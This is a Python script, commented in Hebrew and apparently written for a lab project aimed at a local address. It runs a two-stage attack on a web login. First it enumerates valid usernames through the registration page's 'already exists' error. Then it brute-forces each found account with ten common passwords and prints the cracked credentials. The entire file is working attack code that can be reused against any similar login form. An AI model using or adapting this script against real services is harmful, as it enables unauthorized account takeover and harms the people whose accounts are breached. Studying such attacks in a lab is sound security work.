import requests

# הגדרות כתובות
BASE_URL = "http://192.168.56.1/CyberProject/login.php"
REGISTER_URL = f"{BASE_URL}?view=register"
INPUT_FILE = "usernames.txt"

# מחרוזות לזיהוי
ENUM_ERROR = "Username already exists in the system"
LOGIN_SUCCESS_INDICATOR = "home.php" # אם השרת מפנה אותנו לדף הבית

# רשימת הסיסמאות הנפוצות (Top 10)
COMMON_PASSWORDS = [
    "123456", "admin123", "12345678", "123456789", "12345",
    "password", "Aa123456", "1234567890", "111111", "qwerty"
]

def run_attack():
    found_users = []
    cracked_accounts = []

    # --- שלב 1: User Enumeration (דרך דף הרישום) ---
    try:
        with open(INPUT_FILE, "r") as file:
            potential_names = [line.strip() for line in file if line.strip()]
        
        print(f"[*] Step 1: Enumerating {len(potential_names)} users...")
        for name in potential_names:
            payload = {"reg_username": name, "reg_email": "t@t.com", "reg_password": "p", "register_submit": ""}
            response = requests.post(REGISTER_URL, data=payload)
            
            if ENUM_ERROR in response.text:
                print(f" [!] Found valid username: {name}")
                found_users.append(name)

        if not found_users:
            print("[x] No valid users found. Exiting.")
            return

        # --- שלב 2: Credential Stuffing (דרך דף ה-Login) ---
        print(f"\n[*] Step 2: Starting Brute Force on {len(found_users)} users...")
        for user in found_users:
            print(f" [?] Testing user: {user}")
            for pwd in COMMON_PASSWORDS:
                login_payload = {
                    "username": user,
                    "password": pwd,
                    "login_submit": ""
                }
                
                # אנחנו משתמשים ב-allow_redirects=False כדי לזהות את ההפניה ל-home.php
                response = requests.post(BASE_URL, data=login_payload, allow_redirects=False)
                
                # אם קיבלנו סטטוס 302 (הפניה) ל-home.php, סימן שהצלחנו
                if response.status_code == 302 and LOGIN_SUCCESS_INDICATOR in response.headers.get('Location', ''):
                    print(f"  [SUCCESS] Cracked! {user}:{pwd}")
                    cracked_accounts.append((user, pwd))
                    break # מצאנו סיסמה למשתמש הזה, עוברים לבא בתור
        
        # --- סיכום תוצאות ---
        print("\n" + "="*40)
        print("ATTACK SUMMARY")
        print(f"Users Found: {len(found_users)}")
        print(f"Accounts Cracked: {len(cracked_accounts)}")
        for acc in cracked_accounts:
            print(f" -> {acc[0]} : {acc[1]}")
        print("="*40)

    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    run_attack()